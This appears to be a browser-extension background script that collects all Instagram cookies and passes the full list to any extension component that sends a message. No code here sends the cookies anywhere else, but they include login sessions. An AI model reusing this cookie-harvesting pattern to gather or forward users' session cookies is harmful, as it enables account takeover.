function getCookie(sendResponse) {
  browser.cookies.getAll({
    domain: ".instagram.com"
  }, function(cookieList) {
    sendResponse(cookieList);
  });
}

browser.runtime.onMessage.addListener(function(request, sender, sendResponse) {
  getCookie(sendResponse);
  return true;
});